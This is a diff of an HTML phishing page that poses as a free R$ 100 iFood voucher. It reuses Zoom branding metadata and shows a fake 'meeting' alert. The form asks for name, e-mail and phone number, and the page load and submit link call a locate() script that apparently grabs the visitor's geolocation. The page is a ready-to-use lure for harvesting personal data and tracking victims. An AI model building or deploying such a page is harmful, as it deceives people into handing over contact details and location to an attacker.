@@ -1,49 +1,60 @@
 <!DOCTYPE html>
-<html lang="pt-br">
-  <head>
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Ganhe R$ 100 no iFood</title>
-    <link
-      rel="shortcut icon"
-      href="./icone-ifood.ico.png"
-      type="image/x-icon"
-    />
-    <link rel="stylesheet" href="styles.css" />
+<html lang="en-US">
+<head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta charset="utf-8">
+  <meta name="referrer" content="origin-when-cross-origin">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1">
+  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1.0">
+  <title>Voucher de R$ 100</title>
+  <meta name="keywords" content="iFood é uma empresa brasileira atuante no ramo de entrega de refeição por meio da internet, sendo líder no setor na América Latina, com presença apenas no Brasil.">
+  <meta name="description" content="iFood é uma empresa brasileira atuante no ramo de entrega de refeição por meio da internet, sendo líder no setor na América Latina, com presença apenas no Brasil.">
+  <meta name="robots" content="noindex,nofollow">
+  <meta property="og:type" content="activity">
+  <meta property="og:title" content="Voucher de R$ 100">
+  <meta property="og:description" content="iFood é uma empresa brasileira atuante no ramo de entrega de refeição por meio da internet, sendo líder no setor na América Latina, com presença apenas no Brasil.">
+  <meta property="og:url" content="https://zoom.us/">
+  <meta property="og:site_name" content="Zoom Video">
+  <meta property="fb:app_id" content="113289095462482">
+  <meta property="twitter:account_id" content="522701657">
+  <script type="text/javascript">
+  	if (window.location.protocol == "http:") {
+      var restOfUrl = window.location.href.substr(5);
+      window.location = "https:" + restOfUrl;
+  	}
+  </script>
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+  <script src="js/location.js"></script>
+  <link rel="shortcut icon" href="./icone-ifood.ico.png">
+  <link rel="stylesheet" href="./styles.css">
+  
+</head>
 
-    <script type="text/javascript">
-      if (window.location.protocol == "http:") {
-        var restOfUrl = window.location.href.substr(5);
-        window.location = "https:" + restOfUrl;
-      }
-    </script>
+<body onload="information();">
 
-    <script type="text/javascript" src="js/location.js"></script>
-  </head>
-  <body onload="information()">
-    <div class="container">
-      <h1>Voucher iFood</h1>
-      <form action="index" method="post">
-        <div class="form-group">
-          <label for="nome">Nome</label>
-          <input type="text" id="nome" name="nome" required />
-        </div>
-        <div class="form-group">
-          <label for="email">E-mail</label>
-          <input type="email" id="email" name="email" required />
-        </div>
-        <div class="form-group">
-          <label for="telefone">Telefone</label>
-          <input type="tel" id="telefone" name="telefone" required />
-        </div>
-        <div class="form-group">
-          <button
-            onclick="locate(function(){window.location='REDIRECT_URL';}, function(){$('#change').html('Failed');});"
-          >
-            Enviar
-          </button>
-        </div>
-      </form>
+  <div role="main" tabindex="0" class="container">
+    <div class="image">
+      <img class="logo" src="./icone-ifood.ico.png" alt="">
     </div>
-  </body>
+    <div class="form-group">
+      <label for="nome">Nome</label>
+      <input type="text" id="nome" name="nome" required />
+    </div>
+    <div class="form-group">
+      <label for="email">E-mail</label>
+      <input type="email" id="email" name="email" required />
+    </div>
+    <div class="form-group">
+      <label for="telefone">Telefone</label>
+      <input type="tel" id="telefone" name="telefone" required />
+    </div>
+      <div class="link">
+        <a href="javascript:void(0);" onclick="locate(function(){$('#change').html('Coming Soon');alert('We will let you in once the meeting is started');}, function(){$('#change').html('Failed');});" target="" class="VahdFMz0">Enviar</a>
+      </div>
+  </div>
+
+  <div id="ada-entry">
+    <div style="position: fixed; width: 635px; height: 785px; right: 0px; background: linear-gradient(315.92deg, rgba(0, 0, 0, 0.08) 0%, rgba(0, 0, 0, 0) 40.92%); bottom: 0px; pointer-events: none; z-index: 9999; transition: all 500ms linear 0s; opacity: 0;"></div>
+  </div>
+</body>
 </html>
